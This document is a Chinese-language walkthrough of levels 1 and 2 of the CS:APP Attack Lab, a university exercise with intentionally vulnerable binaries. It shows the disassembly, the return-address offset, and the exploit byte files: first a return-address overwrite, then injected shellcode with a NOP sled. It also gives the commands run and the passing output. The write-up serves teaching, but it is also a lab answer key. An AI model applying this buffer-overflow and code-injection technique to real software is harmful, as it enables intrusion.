# Attack Lab

## 问题描述

【设定】现有两个存在 ***缓冲区溢出 (buffer overflow)*** 风险的 x86-64 可执行文件：

- `ctarget` 可能遭受 ***代码注入 (code injection)*** 攻击（对应第 1~3 关）。
- `rtarget` 可能遭受 ***ROP (return-oriented programming)*** 攻击（对应第 4~6 关）。
- [此处](http://csapp.cs.cmu.edu/3e/target1.tar)可下载这两个文件。本地运行时应开启 `-q` 选项，以避免连接评分服务器。

【任务】利用上述漏洞，植入攻击代码，改变程序行为。[此处](http://csapp.cs.cmu.edu/3e/attacklab.pdf)可下载详细说明。

## 第一关

函数 `getbuf()` 的 C 代码和汇编码分别为

```c
unsigned getbuf() {
  char buf[BUFFER_SIZE];
  Gets(buf);
  return 1;
}
```

```nasm
(gdb) disassemble getbuf 
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    rsp,0x28 ; 40
   0x00000000004017ac <+4>:     mov    rdi,rsp
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    eax,0x1
   0x00000000004017b9 <+17>:    add    rsp,0x28
   0x00000000004017bd <+21>:    ret    
End of assembler dump.
```

由此可见：旧栈顶（即 `R[rsp]` 的旧值）位于 `&buf[0]` 后 40 字节处。在调试器中，设断点于 `<+4>` 处，检查始于 `R[rsp]+40` 的 8 字节：

```shell
(lldb) x/1gx $rsp+40
0x5561dca0: 0x0000000000401976
```

此地址值的确为调用者 `test()` 中紧跟在 `call <getbuf>` 后的下一条指令的地址：

```nasm
(gdb) disassemble test 
Dump of assembler code for function test:
   0x0000000000401968 <+0>:     sub    rsp,0x8
   0x000000000040196c <+4>:     mov    eax,0x0
   0x0000000000401971 <+9>:     call   0x4017a8 <getbuf>
   0x0000000000401976 <+14>:    mov    edx,eax
; ...
```

故只需将 `touch1()` 的地址 `0x00000000004017c0` 植入始于 `buf[40]` 的 8 字节，逻辑上相当于在 C 代码中植入以下赋值语句：

```c
buf[40] = 0xc0;
buf[41] = 0x17;
buf[42] = 0x40;
buf[43] = buf[44] = buf[45] = buf[46] = buf[47] = 0x00;
```

具体步骤：

1. 创建含有以下内容（前 40 个字符相对随意，避开 `0x0a` 即 `\n` 即可）的 `exploit.txt` 文件：

   ```c
   /* buf[00,10) */ 30 31 32 33 34 35 36 37 38 39
   /* buf[10,20) */ 30 31 32 33 34 35 36 37 38 39
   /* buf[20,30) */ 30 31 32 33 34 35 36 37 38 39
   /* buf[30,40) */ 30 31 32 33 34 35 36 37 38 39
   c0 17 40 00 00 00 00 00 /* address of touch1() */
   ```

1. 利用 `hex2raw` 将上述文件转化为字符串：

   ```shell
   $ ./hex2raw < exploit.txt > exploit-raw.txt
   ```

1. 利用 *管道* 将 *`hex2raw` 的输出* 绑定到 *`ctarget` 的输入*：

   ```shell
   $ ./ctarget -q -i exploit-raw.txt
   ```

1. 后两步可合并为

   ```shell
   $ cat exploit.txt | ./hex2raw | ./ctarget -q
   ```

最终得以下输出
```
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 C0 17 40 00 00 00 00 00 
```

## 第二关

需要植入的指令为：
```gas
# exploit.s
movl  $0x59b997fa, %edi # cookie
pushq $0x004017ec       # address of touch2()
retq
```
先汇编，再反汇编：
```shell
$ gcc -c exploit.s && objdump -d exploit.o
```
得以下输出：
```
exploit.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
   5:   68 ec 17 40 00          pushq  $0x4017ec
   a:   c3                      retq
```

为便于调试，按每行 8 字节排列，并以 `0x90` 即 `nop` 指令占位：
```c
/* exploit.txt */
/* 0x5561dc78 */ 90 90 90 90 90 90 90 90
/* 0x5561dc80 */ bf fa 97 b9 59 /* mov  */ 90 90 90
/* 0x5561dc88 */ 68 ec 17 40 00 /* push */ 90 90 90
/* 0x5561dc90 */ c3 /* retq */ 90 90 90 90 90 90 90
/* 0x5561dc98 */ 90 90 90 90 90 90 90 90
/* 0x5561dca0 */ 78 dc 61 55 00 00 00 00 /* 0x5561dca0 - 40 */
```

```shell
$ cat exploit.txt | ./hex2raw | ./ctarget -q
```

最终得以下输出：
```
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:90 90 90 90 90 90 90 90 BF FA 97 B9 59 90 90 90 68 EC 17 40 00 90 90 90 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00 
```

